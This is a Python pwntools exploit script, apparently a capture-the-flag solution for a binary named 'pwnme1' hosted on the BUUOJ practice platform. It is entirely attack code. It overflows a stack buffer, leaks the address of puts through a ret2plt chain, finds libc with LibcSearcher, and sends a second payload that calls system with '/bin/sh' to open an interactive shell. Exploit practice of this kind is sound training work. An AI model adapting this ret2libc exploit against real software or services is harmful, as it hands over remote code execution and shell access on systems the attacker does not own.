#! /usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 28660
elfpath = 'pwnme1'
ldpath = ''
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
sl(b'5')
ru(b'Please input the name of fruit:')

e = ELF(elfpath)
# payload = b'a'*(0xa4 + 4) + p32(0x8048677)
payload = b'a'*(0xa4 + 4)
payload += p32(e.plt['puts']) + p32(e.sym['main']) + p32(e.got['puts']) 

sl(payload)
ru(payload + b'...\n')
puts = u32(r(4))
from LibcSearcher import *

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc.dump('system') + libc_base
binsh = libc.dump('str_bin_sh') + libc_base

payload2 = b'a'*(0xa4 + 4)
payload2 += p32(system) + p32(0xdeadbeef) + p32(binsh)
sl(b'5')
ru(b'Please input the name of fruit:')
sl(payload2)
shell()


